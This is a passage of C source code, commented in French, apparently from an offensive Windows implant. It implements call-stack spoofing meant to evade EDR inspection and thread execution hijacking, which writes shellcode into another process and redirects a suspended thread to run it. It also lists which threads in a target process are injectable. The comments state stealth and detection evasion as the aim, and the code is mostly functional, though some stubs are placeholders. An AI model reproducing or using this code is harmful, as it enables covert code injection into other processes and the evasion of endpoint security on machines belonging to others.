    VirtualProtectEx(hProcess, targetAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    
    success = TRUE;
    
cleanup:
    CloseHandle(hProcess);
    return success;
}

/* =========================================================================
 * Stack Spoofing
 * Masque la vraie call stack pour éviter la détection
 * Utile contre les outils qui inspectent la call stack (EDR)
 * ========================================================================= */

/*
 * Structure pour sauvegarder le contexte original
 */
typedef struct _SPOOF_CONTEXT {
    PVOID OriginalReturnAddress;
    PVOID SpoofedReturnAddress;
    CONTEXT ThreadContext;
} SPOOF_CONTEXT, *PSPOOF_CONTEXT;

/*
 * Trouve une adresse de retour "légitime" dans une DLL système
 */
static PVOID FindLegitimateReturnAddress(void) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return NULL;
    
    /* Cherche une instruction RET dans kernel32 */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + dosHeader->e_lfanew);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE start = (PBYTE)hKernel32 + section[i].VirtualAddress;
            DWORD size = section[i].Misc.VirtualSize;
            
            /* Cherche un RET (0xC3) */
            for (DWORD j = 0; j < size - 1; j++) {
                if (start[j] == 0xC3) {
                    return start + j;
                }
            }
        }
    }
    
    return NULL;
}

/*
 * Crée un trampoline pour spoofer la stack
 * Le trampoline remplace l'adresse de retour avant d'appeler la vraie fonction
 */
BOOL Injection_CreateStackSpoof(PVOID targetFunction, PVOID* outTrampoline) {
    if (!targetFunction || !outTrampoline) return FALSE;
    
    PVOID legitReturn = FindLegitimateReturnAddress();
    if (!legitReturn) return FALSE;
    
    /* Alloue de la mémoire pour le trampoline */
    PVOID trampoline = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!trampoline) return FALSE;
    
    /* Construit le shellcode du trampoline (x64) */
    /* Ce shellcode:
     * 1. Sauvegarde l'adresse de retour réelle
     * 2. Remplace par l'adresse légitime
     * 3. Appelle la fonction cible
     * 4. Restaure l'adresse de retour
     */
    
#ifdef _WIN64
    BYTE trampolineCode[] = {
        /* push rbp */
        0x55,
        /* mov rbp, rsp */
        0x48, 0x89, 0xE5,
        /* sub rsp, 0x20 (shadow space) */
        0x48, 0x83, 0xEC, 0x20,
        /* mov rax, [rbp+8] (return address) */
        0x48, 0x8B, 0x45, 0x08,
        /* push rax (save original) */
        0x50,
        /* mov rax, legitReturn */
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* mov [rbp+8], rax */
        0x48, 0x89, 0x45, 0x08,
        /* mov rax, targetFunction */
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* call rax */
        0xFF, 0xD0,
        /* pop rcx (restore original return) */
        0x59,
        /* mov [rbp+8], rcx */
        0x48, 0x89, 0x4D, 0x08,
        /* add rsp, 0x20 */
        0x48, 0x83, 0xC4, 0x20,
        /* pop rbp */
        0x5D,
        /* ret */
        0xC3
    };
    
    /* Patch les adresses */
    *(PVOID*)(trampolineCode + 16) = legitReturn;
    *(PVOID*)(trampolineCode + 28) = targetFunction;
    
    memcpy(trampoline, trampolineCode, sizeof(trampolineCode));
#else
    /* Version x86 */
    BYTE trampolineCode[] = {
        /* push ebp */
        0x55,
        /* mov ebp, esp */
        0x89, 0xE5,
        /* mov eax, [ebp+4] */
        0x8B, 0x45, 0x04,
        /* push eax */
        0x50,
        /* mov dword ptr [ebp+4], legitReturn */
        0xC7, 0x45, 0x04, 0x00, 0x00, 0x00, 0x00,
        /* call targetFunction */
        0xE8, 0x00, 0x00, 0x00, 0x00,
        /* pop ecx */
        0x59,
        /* mov [ebp+4], ecx */
        0x89, 0x4D, 0x04,
        /* pop ebp */
        0x5D,
        /* ret */
        0xC3
    };
    
    *(PVOID*)(trampolineCode + 11) = legitReturn;
    /* Calcule l'offset relatif pour le call */
    DWORD callOffset = (DWORD)((PBYTE)targetFunction - ((PBYTE)trampoline + 20));
    *(DWORD*)(trampolineCode + 16) = callOffset;
    
    memcpy(trampoline, trampolineCode, sizeof(trampolineCode));
#endif
    
    /* Protège en execute-read */
    DWORD oldProtect;
    VirtualProtect(trampoline, 4096, PAGE_EXECUTE_READ, &oldProtect);
    
    *outTrampoline = trampoline;
    return TRUE;
}

/*
 * Libère un trampoline
 */
BOOL Injection_FreeStackSpoof(PVOID trampoline) {
    if (!trampoline) return FALSE;
    return VirtualFree(trampoline, 0, MEM_RELEASE);
}

/*
 * Exécute une fonction avec stack spoofing
 * Remplace temporairement la call stack visible
 */
typedef PVOID (*GenericFunc)(PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4);

PVOID Injection_CallWithSpoofedStack(PVOID function, PVOID arg1, PVOID arg2, 
                                      PVOID arg3, PVOID arg4) {
    if (!function) return NULL;
    
    PVOID trampoline = NULL;
    if (!Injection_CreateStackSpoof(function, &trampoline)) {
        /* Fallback: appel direct */
        return ((GenericFunc)function)(arg1, arg2, arg3, arg4);
    }
    
    PVOID result = ((GenericFunc)trampoline)(arg1, arg2, arg3, arg4);
    
    Injection_FreeStackSpoof(trampoline);
    
    return result;
}

/* =========================================================================
 * Thread Execution Hijacking
 * Détourne un thread existant pour exécuter notre code
 * Plus discret que CreateRemoteThread car réutilise un thread légitime
 * ========================================================================= */

/* Typedefs pour les fonctions NT */
typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE ThreadHandle, PCONTEXT Context);
typedef NTSTATUS (NTAPI *pNtSetContextThread)(HANDLE ThreadHandle, PCONTEXT Context);
typedef NTSTATUS (NTAPI *pNtSuspendThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

/*
 * Trouve un thread injectable dans un processus
 * Retourne le TID du premier thread trouvé (pas le thread principal si possible)
 */
static DWORD FindInjectableThread(DWORD targetPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    DWORD mainTid = 0;
    DWORD secondaryTid = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                if (mainTid == 0) {
                    mainTid = te.th32ThreadID;
                } else {
                    secondaryTid = te.th32ThreadID;
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    /* Préfère un thread secondaire */
    return secondaryTid ? secondaryTid : mainTid;
}

/*
 * Thread Hijacking - détourne un thread existant pour exécuter du shellcode
 * 
 * Méthode:
 * 1. Suspend le thread cible
 * 2. Sauvegarde son contexte (registres)
 * 3. Modifie RIP/EIP pour pointer vers notre shellcode
 * 4. Resume le thread
 * 5. Le thread exécute notre code puis (optionnellement) restaure le contexte
 */
BOOL Injection_ThreadHijack(DWORD targetPid, DWORD targetTid, 
                            BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteShellcode = NULL;
    BOOL success = FALSE;
    
    /* Si pas de TID spécifié, trouve un thread */
    if (targetTid == 0) {
        targetTid = FindInjectableThread(targetPid);
        if (targetTid == 0) return FALSE;
    }
    
    /* Ouvre le processus */
    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    /* Ouvre le thread */
    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | 
                         THREAD_SET_CONTEXT, FALSE, targetTid);
    if (!hThread) goto cleanup;
    
    /* Résout les fonctions NT */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtSuspendThread NtSuspendThread = (pNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread");
    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
    pNtResumeThread NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
    
    if (!NtSuspendThread || !NtGetContextThread || !NtSetContextThread || !NtResumeThread) {
        goto cleanup;
    }
    
    /* Suspend le thread */
    ULONG suspendCount;
    if (NtSuspendThread(hThread, &suspendCount) != 0) {
        goto cleanup;
    }
    
    /* Alloue la mémoire pour le shellcode */
    remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize + 256,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Écrit le shellcode */
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Récupère le contexte du thread */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (NtGetContextThread(hThread, &ctx) != 0) {
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Sauvegarde l'ancien RIP pour potentielle restauration */
#ifdef _WIN64
    DWORD64 oldRip = ctx.Rip;
    ctx.Rip = (DWORD64)remoteShellcode;
#else
    DWORD oldEip = ctx.Eip;
    ctx.Eip = (DWORD)remoteShellcode;
#endif
    
    /* Applique le nouveau contexte */
    if (NtSetContextThread(hThread, &ctx) != 0) {
        /* Restaure et resume */
#ifdef _WIN64
        ctx.Rip = oldRip;
#else
        ctx.Eip = oldEip;
#endif
        NtSetContextThread(hThread, &ctx);
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Resume le thread - il exécutera notre shellcode */
    NtResumeThread(hThread, &suspendCount);
    
    success = TRUE;
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    /* Note: on ne libère pas remoteShellcode car le thread l'utilise */
    
    return success;
}

/*
 * Thread Hijacking avec restauration automatique du contexte
 * Le shellcode doit être conçu pour restaurer le contexte après exécution
 */
BOOL Injection_ThreadHijackWithRestore(DWORD targetPid, DWORD targetTid,
                                        BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteMemory = NULL;
    BOOL success = FALSE;
    
    if (targetTid == 0) {
        targetTid = FindInjectableThread(targetPid);
        if (targetTid == 0) return FALSE;
    }
    
    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | 
                         THREAD_SET_CONTEXT, FALSE, targetTid);
    if (!hThread) goto cleanup;
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtSuspendThread NtSuspendThread = (pNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread");
    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
    pNtResumeThread NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
    
    ULONG suspendCount;
    if (NtSuspendThread(hThread, &suspendCount) != 0) {
        goto cleanup;
    }
    
    /* Récupère le contexte original */
    CONTEXT originalCtx;
    originalCtx.ContextFlags = CONTEXT_FULL;
    if (NtGetContextThread(hThread, &originalCtx) != 0) {
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Calcule la taille totale nécessaire: 
     * - Contexte original
     * - Shellcode de restauration
     * - Notre shellcode
     */
    SIZE_T totalSize = sizeof(CONTEXT) + 256 + shellcodeSize;
    
    remoteMemory = VirtualAllocEx(hProcess, NULL, totalSize,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    /* Layout en mémoire:
     * [0]                : CONTEXT original
     * [sizeof(CONTEXT)]  : shellcode de restauration
     * [sizeof(CONTEXT)+X]: notre shellcode
     */
    
    PBYTE remoteCtx = (PBYTE)remoteMemory;
    PBYTE remoteRestore = remoteCtx + sizeof(CONTEXT);
    PBYTE remotePayload = remoteRestore + 128;
    
    /* Écrit le contexte original */
    WriteProcessMemory(hProcess, remoteCtx, &originalCtx, sizeof(CONTEXT), NULL);
    
    /* Crée le shellcode de restauration (x64) */
#ifdef _WIN64
    BYTE restoreCode[] = {
        /* call notre shellcode (juste après ce code) */
        0xE8, 0x00, 0x00, 0x00, 0x00,  /* call +5 (placeholder, sera patché) */
        /* Après retour, restaure le contexte... */
        /* Pour simplifier, on fait juste un infinite loop pour l'instant */
        /* Une vraie implémentation utiliserait NtContinue */
        0xEB, 0xFE  /* jmp $ (infinite loop placeholder) */
    };
    
    /* Patch le call offset */
    DWORD callOffset = (DWORD)(remotePayload - (remoteRestore + 5));
    *(DWORD*)(restoreCode + 1) = callOffset;
    
    WriteProcessMemory(hProcess, remoteRestore, restoreCode, sizeof(restoreCode), NULL);
#else
    BYTE restoreCode[] = {
        0xE8, 0x00, 0x00, 0x00, 0x00,  /* call payload */
        0xEB, 0xFE
    };
    DWORD callOffset = (DWORD)(remotePayload - (remoteRestore + 5));
    *(DWORD*)(restoreCode + 1) = callOffset;
    
    WriteProcessMemory(hProcess, remoteRestore, restoreCode, sizeof(restoreCode), NULL);
#endif
    
    /* Écrit notre shellcode */
    WriteProcessMemory(hProcess, remotePayload, shellcode, shellcodeSize, NULL);
    
    /* Modifie le contexte pour exécuter le code de restauration */
    CONTEXT newCtx = originalCtx;
#ifdef _WIN64
    newCtx.Rip = (DWORD64)remoteRestore;
#else
    newCtx.Eip = (DWORD)remoteRestore;
#endif
    
    if (NtSetContextThread(hThread, &newCtx) != 0) {
        NtSetContextThread(hThread, &originalCtx);
        NtResumeThread(hThread, &suspendCount);
        goto cleanup;
    }
    
    NtResumeThread(hThread, &suspendCount);
    success = TRUE;
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

/*
 * Liste les threads d'un processus injectable
 */
BOOL Injection_ListThreads(DWORD targetPid, char** outJson) {
    if (!outJson) return FALSE;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    char* json = (char*)malloc(16384);
    if (!json) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    int offset = snprintf(json, 16384,
        "{\n  \"process_id\": %lu,\n  \"threads\": [\n", targetPid);
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    int count = 0;
    BOOL first = TRUE;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                /* Essaie d'ouvrir le thread pour vérifier l'accès */
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, 
                                           FALSE, te.th32ThreadID);
                BOOL injectable = (hThread != NULL);
                if (hThread) CloseHandle(hThread);
                
                if (!first) {
                    offset += snprintf(json + offset, 16384 - offset, ",\n");
                }
                first = FALSE;
                
                offset += snprintf(json + offset, 16384 - offset,
                    "    {\"tid\": %lu, \"priority\": %ld, \"injectable\": %s}",
                    te.th32ThreadID, te.tpBasePri, injectable ? "true" : "false");
                
                count++;
            }
        } while (Thread32Next(hSnapshot, &te) && count < 100);
    }
    
    CloseHandle(hSnapshot);
    
    snprintf(json + offset, 16384 - offset,
        "\n  ],\n  \"thread_count\": %d\n}", count);
    
    *outJson = json;
    return TRUE;
}
